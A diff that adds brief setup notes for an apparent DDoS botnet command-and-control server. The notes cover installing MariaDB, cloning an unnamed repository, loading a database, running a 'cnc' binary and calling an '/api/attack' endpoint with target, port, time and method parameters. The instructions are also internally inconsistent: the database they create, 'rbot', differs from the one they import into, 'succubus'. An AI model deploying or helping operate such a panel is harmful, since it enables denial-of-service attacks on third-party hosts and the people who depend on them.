@@ -1,0 +1,22 @@
+VPS Hosting ubuntu 22.4 
+https://xxxx.com
+
+apt update -y;apt upgrade -y
+
+apt install mariadb-server git -y
+
+mysql_secure_installation
+
+git clone 
+
+cd rbot
+
+mysql -u root -proot -e "create database rbot;"
+
+mysql -u root -proot succubus < rbot.sql
+
+chmod 777 cnc
+
+./cnc #done!
+
+API: http://<SERVER IP>:1333/api/attack?username=root&api_key=<PASS>&target=1.1.1.1&port=53&time=5&method=hex
